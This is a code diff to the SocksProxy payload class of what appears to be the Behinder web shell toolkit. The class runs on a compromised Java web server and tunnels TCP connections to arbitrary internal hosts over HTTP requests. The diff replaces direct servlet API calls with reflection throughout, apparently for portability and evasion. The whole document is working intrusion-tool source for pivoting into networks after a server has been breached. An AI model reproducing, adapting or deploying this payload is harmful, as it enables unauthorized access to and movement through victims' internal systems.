@@ -1,17 +1,11 @@
 package net.rebeyond.behinder.payload.java;
 
-import java.io.IOException;
+import java.lang.reflect.Method;
 import java.net.InetSocketAddress;
-import java.net.UnknownHostException;
 import java.nio.ByteBuffer;
 import java.nio.channels.SocketChannel;
+import java.util.Enumeration;
 import java.util.Map;
-import javax.servlet.ServletOutputStream;
-import javax.servlet.ServletRequest;
-import javax.servlet.ServletResponse;
-import javax.servlet.http.HttpServletRequest;
-import javax.servlet.http.HttpServletResponse;
-import javax.servlet.http.HttpSession;
 
 public class SocksProxy {
    public static String cmd;
@@ -19,9 +13,9 @@ public class SocksProxy {
    public static String targetPort;
    public static String socketHash;
    public static String extraData;
-   private ServletRequest Request;
-   private ServletResponse Response;
-   private HttpSession Session;
+   private Object Request;
+   private Object Response;
+   private Object Session;
 
    public boolean equals(Object obj) {
       try {
@@ -34,71 +28,69 @@ public class SocksProxy {
    }
 
    public void proxy() throws Exception {
-      HttpServletRequest request = (HttpServletRequest)this.Request;
-      HttpServletResponse response = (HttpServletResponse)this.Response;
-      HttpSession session = this.Session;
+      Object request = this.Request;
+      Object response = this.Response;
+      Object session = this.Session;
       if (cmd != null) {
          if (cmd.compareTo("CONNECT") == 0) {
-            ServletOutputStream so;
             try {
                String target = targetIP;
                int port = Integer.parseInt(targetPort);
                SocketChannel socketChannel = SocketChannel.open();
                socketChannel.connect(new InetSocketAddress(target, port));
                socketChannel.configureBlocking(false);
-               session.setAttribute("socket_" + socketHash, socketChannel);
-               response.setStatus(200);
-            } catch (UnknownHostException var9) {
-               so = response.getOutputStream();
-               so.write(new byte[]{56, 33, 73, 55});
-               so.write(var9.getMessage().getBytes());
-               so.flush();
-               so.close();
-            } catch (IOException var10) {
-               so = response.getOutputStream();
-               so.write(new byte[]{56, 33, 73, 55});
-               so.write(var10.getMessage().getBytes());
-               so.flush();
-               so.close();
+               this.sessionSetAttribute(session, "socket_" + socketHash, socketChannel);
+               response.getClass().getDeclaredMethod("setStatus", Integer.TYPE).invoke(response, 200);
+            } catch (Exception var10) {
+               Object so = this.Response.getClass().getDeclaredMethod("getOutputStream").invoke(this.Response);
+               Method write = so.getClass().getDeclaredMethod("write", byte[].class);
+               write.invoke(so, new byte[]{55, 33, 73, 54});
+               write.invoke(so, var10.getMessage().getBytes());
+               so.getClass().getDeclaredMethod("flush").invoke(so);
+               so.getClass().getDeclaredMethod("close").invoke(so);
             }
          } else {
             SocketChannel socketChannel;
             if (cmd.compareTo("DISCONNECT") == 0) {
                try {
-                  socketChannel = (SocketChannel)session.getAttribute("socket_" + socketHash);
+                  socketChannel = (SocketChannel)this.sessionGetAttribute(session, "socket_" + socketHash);
                   socketChannel.socket().close();
-               } catch (Exception var8) {
+               } catch (Exception var9) {
                }
 
-               session.removeAttribute("socket_" + socketHash);
+               this.sessionRemoveAttribute(session, "socket_" + socketHash);
             } else {
-               ServletOutputStream so = null;
+               Method write;
+               Object so;
                if (cmd.compareTo("READ") == 0) {
-                  socketChannel = (SocketChannel)session.getAttribute("socket_" + socketHash);
+                  socketChannel = (SocketChannel)this.sessionGetAttribute(session, "socket_" + socketHash);
 
                   try {
                      ByteBuffer buf = ByteBuffer.allocate(512);
                      int bytesRead = socketChannel.read(buf);
-                     for(so = response.getOutputStream(); bytesRead > 0; bytesRead = socketChannel.read(buf)) {
-                        so.write(buf.array(), 0, bytesRead);
-                        so.flush();
+                     so = this.Response.getClass().getDeclaredMethod("getOutputStream").invoke(this.Response);
+
+                     for(write = so.getClass().getDeclaredMethod("write", byte[].class, Integer.TYPE, Integer.TYPE); bytesRead > 0; bytesRead = socketChannel.read(buf)) {
+                        write.invoke(so, buf.array(), 0, bytesRead);
+                        so.getClass().getDeclaredMethod("flush").invoke(so);
                         buf.clear();
                      }
 
-                     so.flush();
-                     so.close();
+                     so.getClass().getDeclaredMethod("flush").invoke(so);
+                     so.getClass().getDeclaredMethod("close").invoke(so);
                   } catch (Exception var12) {
-                     response.setStatus(200);
-                     so = response.getOutputStream();
-                     so.write(new byte[]{56, 33, 73, 55});
-                     so.write(var12.getMessage().getBytes());
-                     so.flush();
-                     so.close();
+                     response.getClass().getDeclaredMethod("setStatus", Integer.TYPE).invoke(response, 200);
+                     so = this.Response.getClass().getDeclaredMethod("getOutputStream").invoke(this.Response);
+                     write = so.getClass().getDeclaredMethod("write", byte[].class);
+                     write.invoke(so, new byte[]{55, 33, 73, 54});
+                     write.invoke(so, var12.getMessage().getBytes());
+                     so.getClass().getDeclaredMethod("flush").invoke(so);
+                     so.getClass().getDeclaredMethod("close").invoke(so);
                      socketChannel.socket().close();
                   } catch (Error var13) {
                   }
                } else if (cmd.compareTo("FORWARD") == 0) {
-                  socketChannel = (SocketChannel)session.getAttribute("socket_" + socketHash);
+                  socketChannel = (SocketChannel)this.sessionGetAttribute(session, "socket_" + socketHash);
 
                   try {
                      byte[] extraDataByte = this.base64decode(extraData);
@@ -111,11 +103,12 @@ public class SocksProxy {
                         socketChannel.write(buf);
                      }
                   } catch (Exception var11) {
-                     so = response.getOutputStream();
-                     so.write(new byte[]{56, 33, 73, 55});
-                     so.write(var11.getMessage().getBytes());
-                     so.flush();
-                     so.close();
+                     so = this.Response.getClass().getDeclaredMethod("getOutputStream").invoke(this.Response);
+                     write = so.getClass().getDeclaredMethod("write", byte[].class);
+                     write.invoke(so, new byte[]{55, 33, 73, 54});
+                     write.invoke(so, var11.getMessage().getBytes());
+                     so.getClass().getDeclaredMethod("flush").invoke(so);
+                     so.getClass().getDeclaredMethod("close").invoke(so);
                      socketChannel.socket().close();
                   }
                }
@@ -151,16 +144,54 @@ public class SocksProxy {
 
    private void fillContext(Object obj) throws Exception {
       if (obj.getClass().getName().indexOf("PageContext") >= 0) {
-         this.Request = (ServletRequest)obj.getClass().getDeclaredMethod("getRequest").invoke(obj);
-         this.Response = (ServletResponse)obj.getClass().getDeclaredMethod("getResponse").invoke(obj);
-         this.Session = (HttpSession)obj.getClass().getDeclaredMethod("getSession").invoke(obj);
+         this.Request = obj.getClass().getDeclaredMethod("getRequest").invoke(obj);
+         this.Response = obj.getClass().getDeclaredMethod("getResponse").invoke(obj);
+         this.Session = obj.getClass().getDeclaredMethod("getSession").invoke(obj);
       } else {
          Map objMap = (Map)obj;
-         this.Session = (HttpSession)objMap.get("session");
-         this.Response = (ServletResponse)objMap.get("response");
-         this.Request = (ServletRequest)objMap.get("request");
+         this.Session = objMap.get("session");
+         this.Response = objMap.get("response");
+         this.Request = objMap.get("request");
       }
 
-      this.Response.setCharacterEncoding("UTF-8");
+      this.Response.getClass().getDeclaredMethod("setCharacterEncoding", String.class).invoke(this.Response, "UTF-8");
+   }
+
+   private Object sessionGetAttribute(Object session, String key) {
+      Object result = null;
+
+      try {
+         result = session.getClass().getDeclaredMethod("getAttribute", String.class).invoke(session, key);
+      } catch (Exception var5) {
+      }
+
+      return result;
+   }
+
+   private void sessionSetAttribute(Object session, String key, Object value) {
+      try {
+         session.getClass().getDeclaredMethod("setAttribute", String.class, Object.class).invoke(session, key, value);
+      } catch (Exception var5) {
+      }
+
+   }
+
+   private Enumeration sessionGetAttributeNames(Object session) {
+      Enumeration result = null;
+
+      try {
+         result = (Enumeration)session.getClass().getDeclaredMethod("getAttributeNames").invoke(session);
+      } catch (Exception var4) {
+      }
+
+      return result;
+   }
+
+   private void sessionRemoveAttribute(Object session, String key) {
+      try {
+         session.getClass().getDeclaredMethod("removeAttribute").invoke(session, key);
+      } catch (Exception var4) {
+      }
+
    }
 }
